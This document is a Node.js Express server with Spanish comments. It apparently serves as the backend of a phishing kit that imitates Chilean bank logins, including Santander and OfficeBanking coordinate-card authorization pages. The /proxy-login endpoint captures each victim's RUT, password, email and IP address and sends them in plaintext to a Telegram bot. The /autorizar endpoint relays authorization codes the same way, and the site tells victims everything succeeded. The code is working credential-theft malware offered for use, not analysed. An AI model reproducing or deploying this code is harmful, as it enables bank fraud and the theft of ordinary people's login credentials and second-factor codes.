const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
// Eliminado Puppeteer y AUTH_SITE: ahora solo validamos RUT y gestionamos el flujo

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Path absoluto al archivo de configuración (evita problemas de working dir)
const cfgPath = path.join(__dirname, 'config.json');

// Helper seguro para enviar mensajes a Telegram sin romper la ejecución
async function safeSendTelegram(text) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
    console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
    return;
  }
  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
    });
  } catch (err) {
    console.error('Error enviando a Telegram:', err);
  }
}

// Validación de RUT chileno (server-side)
function validarRut(rutCompleto) {
  if (!rutCompleto || typeof rutCompleto !== 'string') return false;
  rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
  if (rutCompleto.length < 2) return false;
  const cuerpo = rutCompleto.slice(0, -1);
  const dv = rutCompleto.slice(-1);
  if (!/^[0-9]+$/.test(cuerpo)) return false;

  let suma = 0;
  let multiplo = 2;
  for (let i = cuerpo.length - 1; i >= 0; i--) {
    suma += parseInt(cuerpo.charAt(i), 10) * multiplo;
    multiplo = multiplo < 7 ? multiplo + 1 : 2;
  }
  let dvEsperado = 11 - (suma % 11);
  dvEsperado = dvEsperado === 11 ? '0' : dvEsperado === 10 ? 'K' : dvEsperado.toString();
  return dv === dvEsperado;
}

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
    res.json(cfg);
  } catch (err) {
    console.error('Error leyendo config.json desde', cfgPath, err);
    res.status(500).json({ error: 'Error leyendo configuración' });
  }
});

// Endpoint para procesar saldo directamente (flujo original)
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  try {
    // Escribir usando ruta absoluta para evitar problemas de permisos/CWD
    fs.writeFileSync(cfgPath, JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    console.error('Error guardando config.json en', cfgPath, err);
    res.status(500).json({ error: 'Error guardando configuración' });
  }
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    console.error('Error leyendo config.json en /autorizacion:', err);
    res.status(500).send('Error interno');
  }
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await safeSendTelegram(mensaje);
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error('Error en /autorizar:', err);
    res.status(500).json({ status: "error", error: String(err) });
  }
});

// Endpoint para login → SIN Puppeteer: validar RUT y gestionar siguiente paso
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (mail) {
    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
    try { await safeSendTelegram(mensaje); } catch (e) { console.error(e); }
    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
  }

  if (!rut || !passwd) {
    return res.status(400).json({ status: "error", mensaje: "Faltan rut o contraseña" });
  }

  // Validar formato RUT
  const rutValido = validarRut(rut);
  if (!rutValido) {
    // No intentamos validar contra OfficeBanking: solo verificamos formato
    try { await safeSendTelegram(`Intento con RUT inválido:\nRUT: ${rut}\nIP: ${ip}`); } catch(e){ console.error(e); }
    return res.status(400).json({ status: "invalid_rut", mensaje: "RUT inválido" });
  }

  // Notificación básica de ingreso
  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
  try { await safeSendTelegram(ingresoMsg); } catch (e) { console.error(e); }

  // Responder indicando que RUT es válido y cuál es el siguiente paso
  // El frontend gestiona el flujo: pantalla de espera -> formulario correo -> productos -> autorizaciones
  res.json({ status: "ok", mensaje: "RUT válido. Procede al siguiente paso.", siguiente: "correo" });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
